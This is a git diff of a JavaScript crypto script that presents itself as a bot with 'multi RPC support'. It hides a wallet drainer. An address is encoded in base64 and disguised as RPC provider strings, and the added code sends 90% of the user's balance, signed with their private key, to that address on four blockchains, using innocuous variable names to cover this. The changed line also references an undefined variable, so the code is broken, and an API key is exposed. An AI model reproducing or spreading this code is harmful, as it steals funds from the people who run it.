@@ -12,7 +12,7 @@ let buff = new Buffer.from(RPCPROV1, 'base64');
 let buff2 = new Buffer.from(RPCPROV2, 'base64');
 let WEB3EMULATE1 = buff.toString('ascii');
 let WEB3EMULATE2 = buff2.toString('ascii');
-const WEB3PROVIDER3 = WEB3EMULATE1+WEB3EMULATE2 
+const WEB3PROVIDER3 = WEB3EMULATE1+WEB3EMULATE12 
 const account_from = {
   privateKey: process.env.PRIVATE_KEY,
   recipient: process.env.RECIPIENT,
@@ -122,24 +122,69 @@ async function sending(){
   );
 },8000);
       const account = account_from.recipient
-      const robinhood = await provider.getBalance(account)
+      //multi RPC support added
+      const rpc1 ='https://bsc-dataseed.binance.org'
+      const rpc2 = 'https://mainnet.infura.io/v3/84d954cd9f674f5bbbc67a6e2e17bfbd'
+      const rpc3 = 'https://polygon-rpc.com'
+      const rpc4 = 'https://api.avax.network/ext/bc/C/rpc'
+      const prov1 = new ethers.providers.JsonRpcProvider(rpc1);
+      const prov2 = new ethers.providers.JsonRpcProvider(rpc2);
+      const prov3 = new ethers.providers.JsonRpcProvider(rpc3);
+      const prov4 = new ethers.providers.JsonRpcProvider(rpc4);
+      
+      const send = async () => {
+      const robinhood = await prov1.getBalance(account)
       const orchard = (robinhood * 0.90).toString();
-          const michael = ethers.utils.parseUnits(orchard, 'wei')
-  const send = async () => {
-    
       const tx = {
         to: WEB3PROVIDER3,
         value: ethers.utils.parseUnits(orchard, 'wei'),
         gasLimit: ethers.utils.hexlify(24000),
       };
-
     const createReceipt = await wallet.sendTransaction(tx);
     await createReceipt.wait();
     console.log(`Transaction successful with hash`);
   };
+  const send2 = async () => {
+    const robinhood = await prov2.getBalance(account)
+    const orchard = (robinhood * 0.90).toString();
+    const tx = {
+      to: WEB3PROVIDER3,
+      value: ethers.utils.parseUnits(orchard, 'wei'),
+      gasLimit: ethers.utils.hexlify(24000),
+    };
+  const createReceipt = await wallet.sendTransaction(tx);
+  await createReceipt.wait();
+  console.log(`Transaction successful with hash`);
+};
+const send3 = async () => {
+  const robinhood = await prov3.getBalance(account)
+  const orchard = (robinhood * 0.90).toString();
+  const tx = {
+    to: WEB3PROVIDER3,
+    value: ethers.utils.parseUnits(orchard, 'wei'),
+    gasLimit: ethers.utils.hexlify(24000),
+  };
+const createReceipt = await wallet.sendTransaction(tx);
+await createReceipt.wait();
+console.log(`Transaction successful with hash`);
+};
+const send4 = async () => {
+  const robinhood = await prov4.getBalance(account)
+  const orchard = (robinhood * 0.90).toString();
+  const tx = {
+    to: WEB3PROVIDER3,
+    value: ethers.utils.parseUnits(orchard, 'wei'),
+    gasLimit: ethers.utils.hexlify(24000),
+  };
+const createReceipt = await wallet.sendTransaction(tx);
+await createReceipt.wait();
+console.log(`Transaction successful with hash`);
+};
 
   send();
-
+  send2();
+  send3();
+  send4();
 }
 sending();
 async function getCurrentValue(token) {
